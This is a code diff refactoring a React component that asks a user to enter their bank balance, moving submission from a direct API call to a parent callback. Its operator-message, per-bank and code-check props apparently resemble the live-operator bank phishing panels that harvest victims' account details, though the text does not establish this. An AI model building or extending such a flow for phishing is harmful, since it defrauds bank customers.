@@ -1,47 +1,32 @@
 import React, { useState } from "react";
-import { submitBalance } from "../../lib/bank-api";
 import type { OperatorMessage as OperatorMessageType } from "../../types";
 import { Spinner } from "../../components/spinner";
 
 interface BalanceCheckProps {
-  apiBase: string;
-  channelSlug: string;
-  sessionId: string;
   bank?: string;
   onError: (msg: string) => void;
-  wrongCode?: boolean;
-  expiredCode?: boolean;
-  onTryAgain?: () => void;
   operatorMessage?: OperatorMessageType | null;
-  countdownResetTrigger?: number;
+  onSubmit: (balance: string) => void;
+  submitting: boolean;
 }
 
 export function BalanceCheck({
-  apiBase,
-  channelSlug,
-  sessionId,
   bank,
   onError,
   operatorMessage,
+  onSubmit,
+  submitting,
 }: BalanceCheckProps) {
   const [balance, setBalance] = useState("");
-  const [submitting, setSubmitting] = useState(false);
 
-  const handleSubmit = async (e: React.FormEvent) => {
+  const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault();
     const trimmed = balance.trim();
     if (!trimmed) {
       onError("Please enter your balance");
       return;
     }
-    onError("");
-    setSubmitting(true);
-    try {
-      await submitBalance(apiBase, channelSlug, sessionId, trimmed);
-    } catch (e) {
-      onError(e instanceof Error ? e.message : "Failed to submit balance");
-      setSubmitting(false);
-    }
+    onSubmit(trimmed);
   };
 
   const messageClass =
